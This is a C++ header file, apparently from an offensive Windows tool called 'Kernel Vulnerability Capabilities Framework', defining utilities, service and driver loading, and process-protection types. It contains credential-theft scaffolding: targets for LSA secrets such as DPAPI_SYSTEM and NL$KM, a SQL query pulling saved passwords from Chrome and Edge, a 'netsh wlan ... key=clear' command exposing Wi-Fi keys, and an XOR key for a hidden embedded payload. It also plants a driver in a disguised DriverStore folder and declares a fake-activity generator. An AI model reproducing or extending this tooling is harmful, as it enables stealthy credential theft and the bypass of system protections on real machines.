#pragma once

#include <Windows.h>
#include <winternl.h>
#include <DbgHelp.h>
#include <Shellapi.h>
#include <Shlobj.h>
#include <accctrl.h>
#include <aclapi.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <optional>
#include <sstream>
#include <array>
#include <chrono>
#include <memory>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")

// Session management constants
inline constexpr int MAX_SESSIONS = 16;

#ifdef BUILD_DATE
    #define __DATE__ BUILD_DATE
#endif

#ifdef BUILD_TIME  
    #define __TIME__ BUILD_TIME
#endif

#define kvc_DEBUG_ENABLED 0

#ifdef ERROR
#undef ERROR
#endif

#ifndef SHTDN_REASON_MAJOR_SOFTWARE
#define SHTDN_REASON_MAJOR_SOFTWARE 0x00030000
#endif

#ifndef SHTDN_REASON_MINOR_RECONFIGURE  
#define SHTDN_REASON_MINOR_RECONFIGURE 0x00000004
#endif

// Smart module handle management
struct ModuleDeleter {
    void operator()(HMODULE mod) const noexcept {
        if (mod) {
            FreeLibrary(mod);
        }
    }
};

struct SystemModuleDeleter {
    void operator()(HMODULE) const noexcept {
        // System modules obtained via GetModuleHandle don't need to be freed
    }
};

using ModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, ModuleDeleter>;
using SystemModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, SystemModuleDeleter>;

// Fixed logging system with proper buffer size and variadic handling
template<typename... Args>
void PrintMessage(const wchar_t* prefix, const wchar_t* format, Args&&... args)
{
    std::wstringstream ss;
    ss << prefix;
    
    if constexpr (sizeof...(args) == 0)
    {
        ss << format;
    }
    else
    {
        wchar_t buffer[1024];
        swprintf_s(buffer, 1024, format, std::forward<Args>(args)...);
        ss << buffer;
    }
    
    ss << L"\r\n";
    std::wcout << ss.str();
}

template<typename... Args>
void PrintCriticalMessage(const wchar_t* format, Args&&... args) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    WORD originalColor = csbi.wAttributes;
    
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
    
    std::wstringstream ss;
    ss << L"[!] ";
    
    if constexpr (sizeof...(args) > 0) {
        wchar_t buffer[1024];
        swprintf_s(buffer, 1024, format, std::forward<Args>(args)...);
        ss << buffer;
    } else {
        ss << format;  // <-- DODAJ ELSE - gdy brak args, wyświetl sam format
    }
    
    ss << L"\r\n";
    std::wcout << ss.str();
    
    SetConsoleTextAttribute(hConsole, originalColor);
}

#if kvc_DEBUG_ENABLED
    #define DEBUG(format, ...) PrintMessage(L"[DEBUG] ", format, ##__VA_ARGS__)
#else
    #define DEBUG(format, ...) do {} while(0)
#endif

#define ERROR(format, ...) PrintMessage(L"[-] ", format, ##__VA_ARGS__)
#define INFO(format, ...) PrintMessage(L"[*] ", format, ##__VA_ARGS__)
#define SUCCESS(format, ...) PrintMessage(L"[+] ", format, ##__VA_ARGS__)
#define CRITICAL(format, ...) PrintCriticalMessage(format, ##__VA_ARGS__)

#define LASTERROR(f) \
    do { \
        wchar_t buf[256]; \
        swprintf_s(buf, 256, L"[-] The function '%s' failed with error code 0x%08x.\r\n", L##f, GetLastError()); \
        std::wcout << buf; \
    } while(0)

// Windows protection type definitions
enum class PS_PROTECTED_TYPE : UCHAR
{
    None = 0,
    ProtectedLight = 1,
    Protected = 2
};

enum class PS_PROTECTED_SIGNER : UCHAR
{
    None = 0,
    Authenticode = 1,
    CodeGen = 2,
    Antimalware = 3,
    Lsa = 4,
    Windows = 5,
    WinTcb = 6,
    WinSystem = 7,
    App = 8,
    Max = 9
};

// Service-related constants
namespace ServiceConstants {
    inline constexpr wchar_t SERVICE_NAME[] = L"KernelVulnerabilityControl";
    inline constexpr wchar_t SERVICE_DISPLAY_NAME[] = L"Kernel Vulnerability Capabilities Framework";
    inline constexpr wchar_t SERVICE_PARAM[] = L"--service";
    
    // Keyboard hook settings
    inline constexpr int CTRL_SEQUENCE_LENGTH = 5;
    inline constexpr DWORD CTRL_SEQUENCE_TIMEOUT_MS = 2000;
    inline constexpr DWORD CTRL_DEBOUNCE_MS = 50;
}

// DPAPI constants for password extraction
namespace DPAPIConstants {
    inline constexpr int SQLITE_OK = 0;
    inline constexpr int SQLITE_ROW = 100;
    inline constexpr int SQLITE_DONE = 101;
    inline constexpr int SQLITE_OPEN_READONLY = 0x00000001;
    
    inline std::string GetChromeV10Prefix() { return "v10"; }
    inline std::string GetChromeDPAPIPrefix() { return "DPAPI"; }
    
    inline std::wstring GetSecurityPolicySecrets() { return L"SECURITY\\Policy\\Secrets"; }
    inline std::wstring GetDPAPISystemKey() { return L"DPAPI_SYSTEM"; }
    inline std::wstring GetNLKMKey() { return L"NL$KM"; }
    inline std::wstring GetDefaultPasswordKey() { return L"DefaultPassword"; }
    
    inline std::wstring GetCurrVal() { return L"CurrVal"; }
    inline std::wstring GetOldVal() { return L"OldVal"; }
    
    inline std::wstring GetChromeUserData() { return L"\\Google\\Chrome\\User Data"; }
    inline std::wstring GetEdgeUserData() { return L"\\Microsoft\\Edge\\User Data"; }
    inline std::wstring GetLocalStateFile() { return L"\\Local State"; }
    inline std::wstring GetLoginDataFile() { return L"\\Login Data"; }
    
    inline std::string GetEncryptedKeyField() { return "\"encrypted_key\":"; }
    
    inline std::string GetLocalAppData() { return "LOCALAPPDATA"; }
    
    inline std::wstring GetHTMLExt() { return L".html"; }
    inline std::wstring GetTXTExt() { return L".txt"; }
    inline std::wstring GetDBExt() { return L".db"; }
    
    inline std::wstring GetTempLoginDB() { return L"temp_login_data.db"; }
    inline std::wstring GetTempPattern() { return L"temp_login_data"; }
    
    inline std::string GetNetshShowProfiles() { return "netsh wlan show profiles"; }
    inline std::string GetNetshShowProfileKey() { return "netsh wlan show profile name=\""; }
    inline std::string GetNetshKeyClear() { return "\" key=clear"; }
    
    inline std::string GetWiFiProfileMarker() { return "All User Profile"; }
    inline std::string GetWiFiKeyContent() { return "Key Content"; }
    
    inline std::string GetLoginQuery() { return "SELECT origin_url, username_value, password_value FROM logins"; }
    
    inline std::wstring GetStatusDecrypted() { return L"DECRYPTED"; }
    inline std::wstring GetStatusClearText() { return L"CLEAR_TEXT"; }
    inline std::wstring GetStatusEncrypted() { return L"ENCRYPTED"; }
    inline std::wstring GetStatusFailed() { return L"FAILED"; }
    inline std::wstring GetStatusExtracted() { return L"EXTRACTED"; }
}

// Dynamic API loading globals for driver operations
extern ModuleHandle g_advapi32;
extern SystemModuleHandle g_kernel32;
extern decltype(&CreateServiceW) g_pCreateServiceW;
extern decltype(&OpenServiceW) g_pOpenServiceW;
extern decltype(&StartServiceW) g_pStartServiceW;
extern decltype(&DeleteService) g_pDeleteService;
extern decltype(&CreateFileW) g_pCreateFileW;
extern decltype(&ControlService) g_pControlService;

// Service mode detection
extern bool g_serviceMode;
extern volatile bool g_interrupted;

// Core driver functions
bool InitDynamicAPIs() noexcept;
extern "C" const wchar_t* GetServiceNameRaw();  // ASM function
std::wstring GetServiceName() noexcept;          // C++ wrapper
std::wstring GetDriverFileName() noexcept;
void GenerateFakeActivity() noexcept;
std::wstring GetSystemTempPath() noexcept;

// Service utility functions
bool IsServiceInstalled() noexcept;
bool IsServiceRunning() noexcept;
std::wstring GetCurrentExecutablePath() noexcept;

// Driver path helper with dynamic discovery and fallback mechanism
// Searches for actual avc.inf_amd64_* directory in DriverStore FileRepository
// Creates directory if needed, falls back to system32\drivers on failure
inline std::wstring GetDriverStorePath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    std::wstring baseResult = windowsDir;
    std::wstring driverStoreBase = baseResult + L"\\System32\\DriverStore\\FileRepository\\";
    
    // Dynamic search for avc.inf_amd64_* pattern in FileRepository
    WIN32_FIND_DATAW findData;
    std::wstring searchPattern = driverStoreBase + L"avc.inf_amd64_*";
    HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found existing directory - use first match
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                FindClose(hFind);
                return driverStoreBase + findData.cFileName;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // No existing directory found - create with TrustedInstaller privileges
    std::wstring targetPath = driverStoreBase + L"avc.inf_amd64_12ca23d60da30d59";
    return targetPath;
}

// Enhanced version that ensures directory exists before returning path
// Returns empty string on critical failure, valid path on success
inline std::wstring GetDriverStorePathSafe() noexcept {
    std::wstring driverPath = GetDriverStorePath();
    
    // Ensure directory exists - critical for driver operations
    DWORD attrs = GetFileAttributesW(driverPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        // Try to create if it doesn't exist
        if (!CreateDirectoryW(driverPath.c_str(), nullptr) && 
            GetLastError() != ERROR_ALREADY_EXISTS) {
            return L""; // Critical failure
        }
    } else if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return L""; // Path exists but is not a directory
    }
    
    return driverPath;
}

// KVC combined binary processing constants
inline constexpr std::array<BYTE, 7> KVC_XOR_KEY = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
inline constexpr wchar_t KVC_DATA_FILE[]  = L"kvc.dat";
inline constexpr wchar_t KVC_PASS_FILE[]  = L"kvc_pass.exe";
inline constexpr wchar_t KVC_CRYPT_FILE[] = L"kvc_crypt.dll";

// ============================================================================
// CONSOLIDATED UTILITY NAMESPACES - String, Path, Time, Crypto, Privilege
// Centralized implementations to eliminate code duplication across project
// ============================================================================

namespace StringUtils {
    /**
     * @brief Converts UTF-8 encoded narrow string to wide string (UTF-16 LE)
     * @param str UTF-8 encoded std::string
     * @return std::wstring UTF-16 LE encoded wide string, empty on failure
     * @note Returns empty string if conversion fails or input is empty
     */
    inline std::wstring UTF8ToWide(const std::string& str) noexcept {
        if (str.empty()) return L"";
        
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.data(), 
                                             static_cast<int>(str.size()), nullptr, 0);
        if (size_needed <= 0) return L"";
        
        std::wstring result(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.data(), static_cast<int>(str.size()), 
                           result.data(), size_needed);
        return result;
    }
    
    /**
     * @brief Converts wide string (UTF-16 LE) to UTF-8 encoded narrow string
     * @param wstr UTF-16 LE encoded std::wstring
     * @return std::string UTF-8 encoded narrow string, empty on failure
     * @note Returns empty string if conversion fails or input is empty
     */
    inline std::string WideToUTF8(const std::wstring& wstr) noexcept {
        if (wstr.empty()) return "";
        
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), 
                                             static_cast<int>(wstr.size()), 
                                             nullptr, 0, nullptr, nullptr);
        if (size_needed <= 0) return "";
        
        std::string result(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()), 
                           result.data(), size_needed, nullptr, nullptr);
        return result;
    }
    
    /**
     * @brief Converts wide string to lowercase in-place using Windows locale
     * @param str Wide string to convert (modified in-place)
     * @return std::wstring& Reference to modified string for chaining
     */
    inline std::wstring& ToLowerCase(std::wstring& str) noexcept {
        std::transform(str.begin(), str.end(), str.begin(), ::towlower);
        return str;
    }
    
    /**
     * @brief Creates lowercase copy of wide string
     * @param str Wide string to convert
     * @return std::wstring Lowercase copy of input string
     */
    inline std::wstring ToLowerCaseCopy(const std::wstring& str) noexcept {
        std::wstring result = str;
        std::transform(result.begin(), result.end(), result.begin(), ::towlower);
        return result;
    }
}

namespace PathUtils {
    /**
     * @brief Retrieves user's Downloads folder path using modern Windows API
     * @return std::wstring Full path to Downloads folder (e.g., C:\Users\John\Downloads)
     * @note Uses SHGetKnownFolderPath with FOLDERID_Downloads (Windows 10/11)
     * @note Returns empty string on failure, caller must validate
     */
    inline std::wstring GetDownloadsPath() noexcept {
        wchar_t* downloadsPath = nullptr;
        if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, nullptr, &downloadsPath) != S_OK) {
            return L"";
        }
        
        std::wstring result = downloadsPath;
        CoTaskMemFree(downloadsPath);
        return result;
    }
    
    /**
     * @brief Creates timestamped Secrets folder path in user Downloads directory
     * @return std::wstring Full path in format: Downloads\Secrets_DD.MM.YYYY
     * @note Uses current system date for folder naming
     * @note Returns empty string if Downloads path cannot be determined
     */
    inline std::wstring GetDefaultSecretsOutputPath() noexcept {
        std::wstring downloadsPath = GetDownloadsPath();
        if (downloadsPath.empty()) {
            return L"";
        }
        
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &time);
        
        wchar_t dateStr[16];
        swprintf_s(dateStr, L"_%02d.%02d.%04d", 
                   tm.tm_mday, tm.tm_mon + 1, tm.tm_year + 1900);
        
        return downloadsPath + L"\\Secrets" + dateStr;
    }
    
    /**
     * @brief Ensures directory exists, creates if missing including parent directories
     * @param path Directory path to validate/create
     * @return bool true if directory exists or was created successfully
     * @note Uses std::filesystem::create_directories for recursive creation
     */
    inline bool EnsureDirectoryExists(const std::wstring& path) noexcept {
        if (path.empty()) return false;
        
        std::error_code ec;
        if (std::filesystem::exists(path, ec)) {
            return std::filesystem::is_directory(path, ec);
        }
        
        return std::filesystem::create_directories(path, ec) && !ec;
    }
    
    /**
     * @brief Validates directory write access by creating and deleting test file
     * @param path Directory path to test
     * @return bool true if directory is writable, false otherwise
     * @note Creates directory if it doesn't exist
     * @note Cleans up test file after validation
     */
    inline bool ValidateDirectoryWritable(const std::wstring& path) noexcept {
        try {
            std::filesystem::create_directories(path);
            
            std::wstring testFile = path + L"\\test.tmp";
            HANDLE hTest = CreateFileW(testFile.c_str(), GENERIC_WRITE, 0, nullptr, 
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            
            if (hTest == INVALID_HANDLE_VALUE) return false;
            
            CloseHandle(hTest);
            DeleteFileW(testFile.c_str());
            return true;
        } catch (...) {
            return false;
        }
    }
}

namespace TimeUtils {
    /**
     * @brief Generates formatted timestamp string with multiple output formats
     * @param format Format specifier: "date_only", "datetime_file", "datetime_display"
     * @return std::wstring Formatted timestamp in requested format
     * 
     * Format options:
     * - "date_only": DD.MM.YYYY (for folder names in Secrets exports)
     * - "datetime_file": YYYY.MM.DD_HH.MM.SS (for backup filenames)
     * - "datetime_display": YYYY-MM-DD HH:MM:SS (for reports and logs)
     */
    inline std::wstring GetFormattedTimestamp(const char* format = "datetime_file") noexcept {
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &time);
        
        std::wstringstream ss;
        
        if (strcmp(format, "date_only") == 0) {
            ss << std::put_time(&tm, L"%d.%m.%Y");
        }
        else if (strcmp(format, "datetime_display") == 0) {
            ss << std::put_time(&tm, L"%Y-%m-%d %H:%M:%S");
        }
        else { // datetime_file (default)
            ss << std::put_time(&tm, L"%Y.%m.%d_%H.%M.%S");
        }
        
        return ss.str();
    }
}

namespace CryptoUtils {
    /**
     * @brief Decodes Base64-encoded string to binary data using Windows CryptAPI
     * @param encoded Base64-encoded std::string
     * @return std::vector<BYTE> Decoded binary data, empty on failure
     * @note Uses CryptStringToBinaryA for decoding
     */
    inline std::vector<BYTE> Base64Decode(const std::string& encoded) noexcept {
        if (encoded.empty()) return {};
        
        DWORD decodedSize = 0;
        if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                                 nullptr, &decodedSize, nullptr, nullptr)) {
            return {};
        }
        
        std::vector<BYTE> decoded(decodedSize);
        if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                                 decoded.data(), &decodedSize, nullptr, nullptr)) {
            return {};
        }
        
        decoded.resize(decodedSize);
        return decoded;
    }
    
    /**
     * @brief Converts byte vector to hexadecimal string representation
     * @param bytes Binary data to convert
     * @param maxBytes Maximum bytes to convert (0 = unlimited)
     * @return std::string Hex string (e.g., "A0E2808B" for {0xA0, 0xE2, 0x80, 0x8B})
     * @note Appends "..." if truncated due to maxBytes limit
     */
    inline std::string BytesToHex(const std::vector<BYTE>& bytes, size_t maxBytes = 0) noexcept {
        if (bytes.empty()) return "";
        
        size_t limit = (maxBytes > 0 && maxBytes < bytes.size()) ? maxBytes : bytes.size();
        
        std::ostringstream hexStream;
        hexStream << std::hex << std::setfill('0');
        
        for (size_t i = 0; i < limit; ++i) {
            hexStream << std::setw(2) << static_cast<int>(bytes[i]);
        }
        
        if (maxBytes > 0 && bytes.size() > maxBytes) {
            hexStream << "...";
        }
        
        return hexStream.str();
    }
}

namespace PrivilegeUtils {
    /**
     * @brief Enables specified privilege in current process token
     * @param privilege Privilege name constant (e.g., SE_BACKUP_NAME, SE_DEBUG_NAME)
     * @return bool true if privilege enabled successfully, false on failure
     * 
     * @note Automatically opens and closes process token
     * @note Verifies privilege enablement via ERROR_NOT_ALL_ASSIGNED check
     * @note Required for registry backup/restore, process manipulation, etc.
     */
    inline bool EnablePrivilege(LPCWSTR privilege) noexcept {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), 
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tp = {};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, 
                                           sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
        DWORD lastError = GetLastError();
        CloseHandle(hToken);
        
        return result && (lastError == ERROR_SUCCESS);
    }
}